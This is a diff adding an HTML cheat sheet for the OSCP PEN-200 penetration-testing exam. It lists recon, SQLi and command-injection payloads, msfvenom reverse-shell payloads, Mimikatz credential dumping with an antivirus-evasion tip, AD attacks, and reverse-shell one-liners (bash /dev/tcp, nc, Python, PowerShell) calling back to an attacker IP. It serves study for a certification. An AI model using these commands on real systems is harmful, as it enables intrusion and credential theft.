@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<title>OSCP PEN-200 Cheat Sheet</title>
+<meta name="description" content="Complete OSCP PEN-200 cheat sheet covering all penetration testing phases, Active Directory, privilege escalation, and exam strategy."/>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:#F5F6F7; --surface:#FFFFFF; --border:#E2E4E8;
+    --navy:#0F1C2E; --navy2:#1A2E45;
+    --red:#B91C1C; --red-soft:#FEF2F2;
+    --orange:#EA580C; --orange-soft:#FFF7ED;
+    --blue:#1A6FB5; --blue-soft:#EBF4FF;
+    --green:#1B7A4A; --green-soft:#E8F7EF;
+    --purple:#6B21A8; --purple-soft:#F5F0FF;
+    --text:#1C2333; --text2:#4A5568; --text3:#718096;
+    --mono:'Consolas','Courier New',monospace;
+    --sans:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
+  }
+
+  body { font-family:var(--sans); font-size:11px; background:var(--bg); color:var(--text); line-height:1.5; }
+  .page { max-width:1280px; margin:0 auto; padding:20px 16px; }
+
+  .header { background:var(--navy); border-radius:10px; padding:20px 24px; margin-bottom:16px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; }
+  .header-left h1 { font-size:22px; font-weight:800; color:#fff; }
+  .header-left h1 span { color:#F87171; }
+  .header-left p { font-size:11px; color:#94A3B8; margin-top:3px; }
+  .header-badges { display:flex; gap:8px; flex-wrap:wrap; }
+  .badge { font-size:10px; font-weight:700; padding:4px 10px; border-radius:20px; letter-spacing:.5px; text-transform:uppercase; }
+  .badge-red { background:#EF4444; color:#fff; }
+  .badge-orange { background:#F97316; color:#fff; }
+  .badge-purple { background:#A855F7; color:#fff; }
+
+  .grid { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-bottom:12px; }
+  .grid-2 { grid-template-columns:repeat(2,1fr); }
+  .grid-4 { grid-template-columns:repeat(4,1fr); }
+
+  .card { background:var(--surface); border-radius:8px; border:1px solid var(--border); overflow:hidden; }
+  .card-header { padding:8px 12px; display:flex; align-items:center; gap:8px; border-bottom:1px solid var(--border); }
+  .card-header .icon { width:24px; height:24px; border-radius:5px; display:flex; align-items:center; justify-content:center; font-size:12px; flex-shrink:0; }
+  .card-header h2 { font-size:11.5px; font-weight:800; color:var(--navy); }
+  .card-header .sub { font-size:9px; color:var(--text3); margin-left:auto; }
+  .card-body { padding:10px 12px; }
+
+  .section-label { font-size:8.5px; font-weight:800; text-transform:uppercase; letter-spacing:1px; color:var(--text3); margin-bottom:5px; margin-top:9px; }
+  .section-label:first-child { margin-top:0; }
+
+  .row { display:flex; justify-content:space-between; align-items:baseline; padding:2px 0; border-bottom:1px solid #F1F3F5; gap:8px; }
+  .row:last-child { border-bottom:none; }
+  .row .key { font-family:var(--mono); font-size:10px; font-weight:600; color:var(--navy); white-space:nowrap; flex-shrink:0; }
+  .row .val { font-size:10px; color:var(--text2); text-align:right; }
+
+  .tags { display:flex; flex-wrap:wrap; gap:4px; margin-top:2px; }
+  .tag { font-size:9.5px; padding:2px 7px; border-radius:4px; font-weight:600; font-family:var(--mono); }
+  .tag-red { background:var(--red-soft); color:#991B1B; }
+  .tag-orange { background:var(--orange-soft); color:#9A3412; }
+  .tag-blue { background:var(--blue-soft); color:#1E40AF; }
+  .tag-purple { background:var(--purple-soft); color:#6B21A8; }
+
+  .tip-bar { background:var(--navy2); border-radius:8px; padding:10px 16px; margin-bottom:16px; display:flex; gap:24px; flex-wrap:wrap; }
+  .tip-label { font-size:9px; font-weight:800; text-transform:uppercase; letter-spacing:1px; color:#F87171; }
+  .tip { font-size:10.5px; color:#CBD5E1; }
+  .tip b { color:#fff; }
+
+  .note { font-size:10px; color:var(--text2); padding:6px 8px; border-radius:4px; margin-top:4px; }
+  .note-red { background:var(--red-soft); border-left:3px solid var(--red); }
+  .note-orange { background:var(--orange-soft); border-left:3px solid var(--orange); }
+  .note-blue { background:var(--blue-soft); border-left:3px solid var(--blue); }
+
+  .cmd { font-family:var(--mono); font-size:10px; background:#F1F3F5; padding:3px 7px; border-radius:4px; color:var(--navy); display:block; margin:2px 0; overflow-x:auto; white-space:nowrap; }
+
+  @media print { body{background:#fff} .page{padding:0} }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="header-left">
+      <h1>OSCP <span>PEN-200</span> Cheat Sheet</h1>
+      <p>OffSec Certified Professional — Practical Penetration Testing Reference</p>
+    </div>
+    <div class="header-badges">
+      <span class="badge badge-red">24h Exam</span>
+      <span class="badge badge-orange">70 / 100 to Pass</span>
+      <span class="badge badge-purple">No Multiple Choice</span>
+    </div>
+  </div>
+
+  <!-- EXAM SCORING TIP BAR -->
+  <div class="tip-bar">
+    <div>
+      <div class="tip-label">Exam Tips</div>
+      <div class="tip"><b>Take notes continuously</b> — document every step for your report</div>
+    </div>
+    <div>
+      <div class="tip-label">Proof Files</div>
+      <div class="tip"><b>Screenshot proof.txt / local.txt immediately</b> — don't lose the moment</div>
+    </div>
+    <div>
+      <div class="tip-label">Time Management</div>
+      <div class="tip"><b>Don't rabbit-hole</b> — move on after 30–45 min of no progress</div>
+    </div>
+    <div>
+      <div class="tip-label">Strategy</div>
+      <div class="tip"><b>Easy wins first</b> — grab low-hanging fruit before complex chains</div>
+    </div>
+    <div>
+      <div class="tip-label">Report</div>
+      <div class="tip"><b>24h to write report</b> — all steps must be reproducible with screenshots</div>
+    </div>
+  </div>
+
+  <!-- ROW 1: SCORING + RECON -->
+  <div class="grid">
+
+    <!-- SCORING CARD -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#FEF2F2;">&#127919;</div>
+        <h2>Exam Scoring</h2>
+        <span class="sub">100 pts total</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Point Breakdown</div>
+        <div class="row"><span class="key">Standalone x3</span><span class="val">10 pts each = 30 pts</span></div>
+        <div class="row"><span class="key">AD Set (DC + 2 clients)</span><span class="val">40 pts total</span></div>
+        <div class="row"><span class="key">Bonus Points</span><span class="val">from lab report (up to 10)</span></div>
+        <div class="row"><span class="key">Pass Threshold</span><span class="val">70 / 100 pts</span></div>
+        <div class="row"><span class="key">Exam Duration</span><span class="val">24h practical + 24h report</span></div>
+        <div class="note note-red" style="margin-top:6px;">No multiple choice — pure penetration testing. All exploitation must be manual.</div>
+
+        <div class="section-label">Proof Files</div>
+        <div class="row"><span class="key">local.txt</span><span class="val">low-priv shell (some boxes)</span></div>
+        <div class="row"><span class="key">proof.txt</span><span class="val">root/SYSTEM — required for pts</span></div>
+        <div class="row"><span class="key">Screenshots</span><span class="val">ifconfig/ipconfig + proof hash</span></div>
+      </div>
+    </div>
+
+    <!-- PHASE 1: RECON CARD -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#EBF4FF;">&#128270;</div>
+        <h2>Phase 1 — Recon &amp; Enumeration</h2>
+        <span class="sub">nmap · gobuster</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Nmap Scans</div>
+        <code class="cmd">nmap -sV -sC -p- --open -oA nmap/initial &lt;target&gt;</code>
+        <code class="cmd">nmap -sU --top-ports 20 &lt;target&gt;</code>
+        <code class="cmd">nmap -A -T4 -p &lt;ports&gt; &lt;target&gt;</code>
+
+        <div class="section-label">Web Enumeration</div>
+        <code class="cmd">gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt</code>
+        <code class="cmd">feroxbuster -u http://&lt;target&gt; -w wordlist</code>
+        <code class="cmd">nikto -h http://&lt;target&gt;</code>
+        <code class="cmd">whatweb http://&lt;target&gt;</code>
+        <code class="cmd">wfuzz -c -w wordlist -H "Host: FUZZ.target.htb" http://&lt;target&gt;</code>
+
+        <div class="section-label">SMB / RPC / LDAP</div>
+        <code class="cmd">enum4linux-ng -A &lt;target&gt;</code>
+        <code class="cmd">smbclient -L //&lt;target&gt; -N</code>
+        <code class="cmd">rpcclient -U "" &lt;target&gt;</code>
+        <code class="cmd">ldapsearch -x -H ldap://&lt;target&gt; -s base namingContexts</code>
+      </div>
+    </div>
+
+    <!-- PHASE 2: WEB EXPLOITATION -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#FFF7ED;">&#127760;</div>
+        <h2>Phase 2 — Web Exploitation</h2>
+        <span class="sub">LFI · SQLi · SSRF</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">File Inclusion (LFI → RCE)</div>
+        <div class="row"><span class="key">PHP wrapper</span><span class="val">php://filter/convert.base64-encode</span></div>
+        <div class="row"><span class="key">Log poisoning</span><span class="val">inject PHP in User-Agent → include log</span></div>
+        <div class="row"><span class="key">/proc/self/environ</span><span class="val">inject via HTTP_USER_AGENT</span></div>
+
+        <div class="section-label">File Upload Bypass</div>
+        <div class="row"><span class="key">Content-Type</span><span class="val">change to image/jpeg</span></div>
+        <div class="row"><span class="key">Double extension</span><span class="val">shell.php.jpg</span></div>
+        <div class="row"><span class="key">Null byte</span><span class="val">shell.php%00.jpg</span></div>
+
+        <div class="section-label">Injection Attacks</div>
+        <code class="cmd">SQLi: ' OR 1=1--   UNION SELECT null,null--</code>
+        <code class="cmd">Time-based: ' AND SLEEP(5)--</code>
+        <code class="cmd">Cmd inject: ; id   | whoami   &amp;&amp; cat /etc/passwd</code>
+        <code class="cmd">SSRF: http://169.254.169.254/latest/meta-data/</code>
+
+        <div class="section-label">XXE / Deserialization</div>
+        <div class="row"><span class="key">XXE</span><span class="val">external entity → /etc/passwd read</span></div>
+        <div class="row"><span class="key">Java deser</span><span class="val">ysoserial payload via gadget chains</span></div>
+        <div class="row"><span class="key">Python pickle</span><span class="val">__reduce__ RCE via crafted pickle</span></div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ROW 2: SERVICE EXPLOITATION + AD + LINUX PRIVESC -->
+  <div class="grid">
+
+    <!-- PHASE 3: SERVICE EXPLOITATION -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#FEF2F2;">&#128165;</div>
+        <h2>Phase 3 — Service Exploitation</h2>
+        <span class="sub">searchsploit · msfvenom · BOF</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Finding &amp; Using Exploits</div>
+        <code class="cmd">searchsploit &lt;service&gt; &lt;version&gt;</code>
+        <code class="cmd">searchsploit -m &lt;exploit/path&gt;</code>
+        <code class="cmd">python2 exploit.py / python3 exploit.py</code>
+        <div class="note note-orange">Always update LHOST, LPORT, and target IP in exploit scripts before running.</div>
+
+        <div class="section-label">msfvenom Payloads</div>
+        <code class="cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe</code>
+        <code class="cmd">msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=443 -f elf -o shell.elf</code>
+        <code class="cmd">msfvenom -p php/reverse_php LHOST=IP LPORT=443 -f raw -o shell.php</code>
+
+        <div class="section-label">Buffer Overflow (Basic)</div>
+        <div class="row"><span class="key">1. Fuzz</span><span class="val">crash with cyclic pattern</span></div>
+        <div class="row"><span class="key">2. Offset</span><span class="val">msf-pattern_create / pattern_offset</span></div>
+        <div class="row"><span class="key">3. EIP control</span><span class="val">confirm overwrite at offset</span></div>
+        <div class="row"><span class="key">4. Bad chars</span><span class="val">compare byte array in memory</span></div>
+        <div class="row"><span class="key">5. JMP ESP</span><span class="val">!mona find -s "\xff\xe4" -m dll</span></div>
+        <div class="row"><span class="key">6. Shellcode</span><span class="val">msfvenom -b "&lt;badchars&gt;" -f c</span></div>
+      </div>
+    </div>
+
+    <!-- PHASE 4: ACTIVE DIRECTORY -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#F5F0FF;">&#127981;</div>
+        <h2>Phase 4 — Active Directory</h2>
+        <span class="sub">kerbrute · bloodhound · CME</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">User Enumeration &amp; Kerberos</div>
+        <code class="cmd">kerbrute userenum --dc &lt;target&gt; -d domain.local users.txt</code>
+        <code class="cmd">impacket-GetNPUsers domain/ -usersfile users.txt -no-pass</code>
+        <code class="cmd">impacket-GetUserSPNs domain/user:pass -dc-ip &lt;target&gt;</code>
+        <div class="row"><span class="key">AS-REP Roasting</span><span class="val">no pre-auth required → hash crack</span></div>
+        <div class="row"><span class="key">Kerberoasting</span><span class="val">SPN → TGS hash → hashcat -m 13100</span></div>
+
+        <div class="section-label">Enumeration &amp; Lateral Movement</div>
+        <code class="cmd">bloodhound-python -u user -p pass -d domain.local -dc &lt;target&gt; -c all</code>
+        <code class="cmd">crackmapexec smb &lt;target&gt; -u user -p pass</code>
+        <code class="cmd">crackmapexec smb &lt;target&gt; -u user -H &lt;hash&gt;</code>
+
+        <div class="section-label">Remote Execution</div>
+        <code class="cmd">evil-winrm -i &lt;target&gt; -u user -p pass</code>
+        <code class="cmd">evil-winrm -i &lt;target&gt; -u user -H &lt;hash&gt;</code>
+        <code class="cmd">impacket-psexec domain/user:pass@&lt;target&gt;</code>
+        <code class="cmd">impacket-wmiexec domain/user:pass@&lt;target&gt;</code>
+
+        <div class="section-label">Domain Compromise</div>
+        <code class="cmd">impacket-secretsdump domain/user:pass@&lt;target&gt;</code>
+        <code class="cmd">impacket-secretsdump -just-dc domain/admin:pass@DC-IP</code>
+        <div class="note note-blue">DCSync requires Domain Admin or equivalent. BloodHound finds delegation paths to DA.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 5: LINUX PRIVESC -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#E8F7EF;">&#128039;</div>
+        <h2>Phase 5 — Linux PrivEsc</h2>
+        <span class="sub">sudo · SUID · cron · caps</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Quick Wins</div>
+        <code class="cmd">sudo -l</code>
+        <code class="cmd">find / -perm -4000 -type f 2&gt;/dev/null</code>
+        <code class="cmd">getcap -r / 2&gt;/dev/null</code>
+        <code class="cmd">cat /etc/crontab; ls -la /etc/cron*</code>
+
+        <div class="section-label">Writable Files &amp; PATH Hijack</div>
+        <code class="cmd">find / -writable -type f 2&gt;/dev/null</code>
+        <code class="cmd">export PATH=/tmp:$PATH; echo '/bin/bash' &gt; /tmp/&lt;cmd&gt;; chmod +x /tmp/&lt;cmd&gt;</code>
+
+        <div class="section-label">Process &amp; System Info</div>
+        <code class="cmd">./pspy64</code>
+        <code class="cmd">uname -a; cat /etc/os-release</code>
+        <code class="cmd">cat /etc/passwd; cat /etc/shadow</code>
+        <code class="cmd">find / -name "*.conf" -readable 2&gt;/dev/null</code>
+
+        <div class="section-label">GTFOBins Quick Reference</div>
+        <div class="tags">
+          <span class="tag tag-red">vim</span>
+          <span class="tag tag-red">find</span>
+          <span class="tag tag-red">python</span>
+          <span class="tag tag-red">perl</span>
+          <span class="tag tag-orange">nmap</span>
+          <span class="tag tag-orange">awk</span>
+          <span class="tag tag-orange">less</span>
+          <span class="tag tag-orange">more</span>
+          <span class="tag tag-blue">tar</span>
+          <span class="tag tag-blue">cp</span>
+          <span class="tag tag-blue">bash</span>
+          <span class="tag tag-purple">env</span>
+        </div>
+        <div class="note note-blue" style="margin-top:6px;">Check gtfobins.github.io for sudo/SUID escape commands per binary.</div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ROW 3: WINDOWS PRIVESC + POST-EXPLOITATION + TUNNELING -->
+  <div class="grid">
+
+    <!-- PHASE 6: WINDOWS PRIVESC -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#EBF4FF;">&#128187;</div>
+        <h2>Phase 6 — Windows PrivEsc</h2>
+        <span class="sub">WinPEAS · PowerUp · tokens</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Automated Enumeration</div>
+        <code class="cmd">.\winpeas.exe</code>
+        <code class="cmd">.\PowerUp.ps1; Invoke-AllChecks</code>
+        <code class="cmd">whoami /priv</code>
+
+        <div class="section-label">Token / Privilege Abuse</div>
+        <div class="row"><span class="key">SeImpersonatePrivilege</span><span class="val">PrintSpoofer / GodPotato</span></div>
+        <code class="cmd">PrintSpoofer.exe -i -c cmd</code>
+        <code class="cmd">GodPotato.exe -cmd "cmd /c whoami"</code>
+        <div class="note note-red">SeImpersonate on IIS/SQL service accounts — very common in OSCP labs.</div>
+
+        <div class="section-label">Service Misconfigurations</div>
+        <code class="cmd">sc qc &lt;service_name&gt;</code>
+        <code class="cmd">icacls "C:\Program Files\&lt;service&gt;"</code>
+        <code class="cmd">wmic service get name,pathname,startmode</code>
+        <div class="row"><span class="key">Unquoted path</span><span class="val">place exe at each space in path</span></div>
+        <div class="row"><span class="key">Weak ACL</span><span class="val">replace binary → restart service</span></div>
+
+        <div class="section-label">Registry Checks</div>
+        <code class="cmd">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code>
+        <div class="row"><span class="key">AlwaysInstallElevated</span><span class="val">both HKCU + HKLM = 1 → MSI RCE</span></div>
+        <code class="cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f msi -o evil.msi</code>
+      </div>
+    </div>
+
+    <!-- PHASE 7: POST-EXPLOITATION -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#FEF2F2;">&#128273;</div>
+        <h2>Phase 7 — Post-Exploitation</h2>
+        <span class="sub">mimikatz · creds · lsass</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Mimikatz (Windows)</div>
+        <code class="cmd">privilege::debug</code>
+        <code class="cmd">sekurlsa::logonpasswords</code>
+        <code class="cmd">lsadump::sam</code>
+        <code class="cmd">lsadump::dcsync /domain:domain.local /user:Administrator</code>
+        <div class="note note-orange">Run as SYSTEM or with debug privilege. AV may block — use obfuscated version or procdump.</div>
+
+        <div class="section-label">Offline LSASS Dump</div>
+        <code class="cmd">procdump64.exe -ma lsass.exe lsass.dmp</code>
+        <code class="cmd">sekurlsa::minidump lsass.dmp</code>
+        <code class="cmd">sekurlsa::logonpasswords</code>
+
+        <div class="section-label">Windows Credential Files</div>
+        <div class="row"><span class="key">%APPDATA%\Microsoft</span><span class="val">credential manager blobs</span></div>
+        <div class="row"><span class="key">web.config</span><span class="val">IIS app DB credentials</span></div>
+        <div class="row"><span class="key">unattend.xml</span><span class="val">base64 admin password</span></div>
+        <div class="row"><span class="key">SAM + SYSTEM hives</span><span class="val">reg save → secretsdump offline</span></div>
+        <code class="cmd">reg save HKLM\SAM sam.hiv &amp;&amp; reg save HKLM\SYSTEM sys.hiv</code>
+
+        <div class="section-label">Linux Credential Hunting</div>
+        <code class="cmd">cat ~/.bash_history</code>
+        <code class="cmd">find / -name "*.txt" 2&gt;/dev/null | xargs grep -i password</code>
+        <code class="cmd">find / -name "config*" -readable 2&gt;/dev/null | xargs grep -i "pass\|secret\|key"</code>
+      </div>
+    </div>
+
+    <!-- PHASE 8: TUNNELING -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#F5F0FF;">&#128258;</div>
+        <h2>Phase 8 — Tunneling &amp; Pivoting</h2>
+        <span class="sub">chisel · ligolo · SSH · proxychains</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Chisel (SOCKS Proxy)</div>
+        <code class="cmd">./chisel server -p 8000 --reverse</code>
+        <code class="cmd">./chisel client &lt;attacker&gt;:8000 R:1080:socks</code>
+        <div class="row"><span class="key">proxychains.conf</span><span class="val">socks5 127.0.0.1 1080</span></div>
+        <code class="cmd">proxychains nmap -sT -Pn &lt;internal-target&gt;</code>
+
+        <div class="section-label">Ligolo-ng</div>
+        <code class="cmd">./proxy -selfcert -laddr 0.0.0.0:11601</code>
+        <code class="cmd">./agent -connect &lt;attacker&gt;:11601 -ignore-cert</code>
+        <div class="row"><span class="key">Add route</span><span class="val">ip route add &lt;subnet&gt; dev ligolo</span></div>
+
+        <div class="section-label">SSH Tunneling</div>
+        <code class="cmd">ssh -L 8080:internal:80 user@pivot</code>
+        <code class="cmd">ssh -R 8080:localhost:80 user@target</code>
+        <code class="cmd">ssh -D 1080 user@pivot</code>
+
+        <div class="section-label">Socat Port Forward</div>
+        <code class="cmd">socat TCP-LISTEN:8080,fork TCP:&lt;internal&gt;:80</code>
+
+        <div class="section-label">Listener Setup (Attacker)</div>
+        <code class="cmd">nc -lvnp 443</code>
+        <code class="cmd">rlwrap nc -lvnp 443</code>
+        <code class="cmd">python3 -m http.server 80</code>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ROW 4: SHELLS + HASH CRACKING + REPORT (grid-4 becomes grid of 2+2) -->
+  <div class="grid grid-4">
+
+    <!-- SHELL UPGRADES -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#E8F7EF;">&#128315;</div>
+        <h2>Shell Upgrades</h2>
+        <span class="sub">TTY · pty</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Linux TTY Upgrade</div>
+        <code class="cmd">python3 -c 'import pty;pty.spawn("/bin/bash")'</code>
+        <code class="cmd">Ctrl+Z</code>
+        <code class="cmd">stty raw -echo; fg</code>
+        <code class="cmd">export TERM=xterm</code>
+
+        <div class="section-label">One-liners (Reverse Shells)</div>
+        <code class="cmd">bash -i &gt;&amp; /dev/tcp/IP/443 0&gt;&amp;1</code>
+        <code class="cmd">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc IP 443 &gt;/tmp/f</code>
+        <code class="cmd">python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'</code>
+
+        <div class="section-label">Windows PowerShell</div>
+        <code class="cmd">powershell -nop -c "$client=New-Object Net.Sockets.TCPClient('IP',443);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2&gt;&amp;1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'&gt; ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code>
+      </div>
+    </div>
+
+    <!-- HASH CRACKING -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#FFF7ED;">&#128296;</div>
+        <h2>Hash Cracking</h2>
+        <span class="sub">hashcat · john · wordlists</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Hashcat Modes</div>
+        <div class="row"><span class="key">-m 0</span><span class="val">MD5</span></div>
+        <div class="row"><span class="key">-m 1000</span><span class="val">NTLM</span></div>
+        <div class="row"><span class="key">-m 1800</span><span class="val">sha512crypt (Linux $6$)</span></div>
+        <div class="row"><span class="key">-m 13100</span><span class="val">Kerberoast TGS-REP</span></div>
+        <div class="row"><span class="key">-m 18200</span><span class="val">AS-REP Roast</span></div>
+        <div class="row"><span class="key">-m 5600</span><span class="val">NTLMv2</span></div>
+        <code class="cmd">hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt</code>
+        <code class="cmd">hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?d?d</code>
+
+        <div class="section-label">John the Ripper</div>
+        <code class="cmd">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code>
+        <code class="cmd">unshadow /etc/passwd /etc/shadow &gt; combined.txt</code>
+        <code class="cmd">john combined.txt --wordlist=rockyou.txt</code>
+
+        <div class="section-label">Identify Hash</div>
+        <code class="cmd">hashid hash.txt</code>
+        <code class="cmd">hash-identifier</code>
+      </div>
+    </div>
+
+    <!-- FILE TRANSFERS -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#EBF4FF;">&#128228;</div>
+        <h2>File Transfers</h2>
+        <span class="sub">wget · certutil · impacket</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Linux Download</div>
+        <code class="cmd">wget http://IP/file -O /tmp/file</code>
+        <code class="cmd">curl http://IP/file -o /tmp/file</code>
+        <code class="cmd">python3 -c "import urllib.request; urllib.request.urlretrieve('http://IP/file','/tmp/file')"</code>
+
+        <div class="section-label">Windows Download</div>
+        <code class="cmd">certutil -urlcache -f http://IP/file C:\Windows\Temp\file</code>
+        <code class="cmd">powershell (New-Object Net.WebClient).DownloadFile('http://IP/file','C:\Temp\file')</code>
+        <code class="cmd">iwr http://IP/file -OutFile C:\Temp\file</code>
+
+        <div class="section-label">Hosting Files</div>
+        <code class="cmd">python3 -m http.server 80</code>
+        <code class="cmd">impacket-smbserver share . -smb2support</code>
+        <code class="cmd">updog -p 80</code>
+
+        <div class="section-label">Windows from SMB Share</div>
+        <code class="cmd">copy \\IP\share\file C:\Temp\file</code>
+        <code class="cmd">net use \\IP\share /user:user pass</code>
+      </div>
+    </div>
+
+    <!-- PHASE 9: REPORT WRITING -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#FEF2F2;">&#128196;</div>
+        <h2>Phase 9 — Report Writing</h2>
+        <span class="sub">required · reproducible</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Required Sections</div>
+        <div class="row"><span class="key">Executive Summary</span><span class="val">non-technical, business impact</span></div>
+        <div class="row"><span class="key">Findings per Machine</span><span class="val">vulnerability + evidence + fix</span></div>
+        <div class="row"><span class="key">CVSS Score</span><span class="val">for each finding</span></div>
+        <div class="row"><span class="key">Proof Screenshots</span><span class="val">proof.txt + IP visible</span></div>
+        <div class="row"><span class="key">All Steps</span><span class="val">must be fully reproducible</span></div>
+
+        <div class="section-label">Per-Finding Template</div>
+        <div class="row"><span class="key">Title</span><span class="val">short vulnerability name</span></div>
+        <div class="row"><span class="key">Severity</span><span class="val">Critical / High / Medium / Low</span></div>
+        <div class="row"><span class="key">Description</span><span class="val">what it is and why it matters</span></div>
+        <div class="row"><span class="key">Evidence</span><span class="val">screenshots + command output</span></div>
+        <div class="row"><span class="key">Remediation</span><span class="val">specific actionable fix</span></div>
+
+        <div class="note note-red" style="margin-top:6px;">If screenshots don't show the IP + proof hash together, the points may not count. Screenshot both immediately on compromise.</div>
+
+        <div class="section-label">OffSec Report Template</div>
+        <div class="row"><span class="key">Format</span><span class="val">PDF, submitted via exam portal</span></div>
+        <div class="row"><span class="key">Tool</span><span class="val">Cherry Tree / Obsidian / GitBook</span></div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ROW 5: COMMON PORTS + WORDLISTS + AD ATTACK PATHS -->
+  <div class="grid">
+
+    <!-- COMMON PORTS -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#EBF4FF;">&#128225;</div>
+        <h2>Common Ports &amp; Services</h2>
+        <span class="sub">quick reference</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Network Services</div>
+        <div class="row"><span class="key">21</span><span class="val">FTP — anonymous login, dir traversal</span></div>
+        <div class="row"><span class="key">22</span><span class="val">SSH — weak creds, key reuse</span></div>
+        <div class="row"><span class="key">23</span><span class="val">Telnet — cleartext creds</span></div>
+        <div class="row"><span class="key">25 / 587</span><span class="val">SMTP — user enum, relay</span></div>
+        <div class="row"><span class="key">53</span><span class="val">DNS — zone transfer, subdomain brute</span></div>
+        <div class="row"><span class="key">80 / 443</span><span class="val">HTTP/S — full web attack surface</span></div>
+        <div class="row"><span class="key">110 / 143</span><span class="val">POP3 / IMAP — cred spray</span></div>
+        <div class="row"><span class="key">139 / 445</span><span class="val">SMB — EternalBlue, null sessions</span></div>
+        <div class="row"><span class="key">389 / 636</span><span class="val">LDAP — anonymous bind, enum</span></div>
+        <div class="row"><span class="key">1433</span><span class="val">MSSQL — xp_cmdshell, creds</span></div>
+        <div class="row"><span class="key">3306</span><span class="val">MySQL — UDF, file read/write</span></div>
+        <div class="row"><span class="key">3389</span><span class="val">RDP — cred brute, BlueKeep</span></div>
+        <div class="row"><span class="key">5985 / 5986</span><span class="val">WinRM — evil-winrm access</span></div>
+        <div class="row"><span class="key">8080 / 8443</span><span class="val">Alt HTTP — admin panels, Jenkins</span></div>
+      </div>
+    </div>
+
+    <!-- WORDLISTS + TOOLS -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon" style="background:#E8F7EF;">&#128218;</div>
+        <h2>Wordlists &amp; Key Tools</h2>
+        <span class="sub">kali paths</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Wordlist Locations (Kali)</div>
+        <div class="row"><span class="key">rockyou.txt</span><span class="val">/usr/share/wordlists/</span></div>
+        <div class="row"><span class="key">dirbuster medium</span><span class="val">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></div>
+        <div class="row"><span class="key">SecLists</span><span class="val">/usr/share/seclists/</span></div>
+        <div class="row"><span class="key">common.txt</span><span class="val">/usr/share/dirb/wordlists/common.txt</span></div>
+
+        <div class="section-label">Essential Tools</div>
+        <div class="tags" style="margin-bottom:4px;">
+          <span class="tag tag-red">nmap</span>
+          <span class="tag tag-red">gobuster</span>
+          <span class="tag tag-red">feroxbuster</span>
+          <span class="tag tag-red">nikto</span>
+          <span class="tag tag-orange">impacket</span>
+          <span class="tag tag-orange">bloodhound</span>
+          <span class="tag tag-orange">crackmapexec</span>
+          <span class="tag tag-blue">evil-winrm</span>
+          <span class="tag tag-blue">chisel</span>
+          <span class="tag tag-blue">ligolo-ng</span>
+          <span class="tag tag-blue">pspy64</span>
+          <span class="tag tag-purple">winpeas</span>
+          <span class="tag tag-purple">linpeas</span>
+          <span class="tag tag-purple">mimikatz</span>
+        </div>
+
+        <div class="section-label">Auto-PrivEsc Scripts</div>
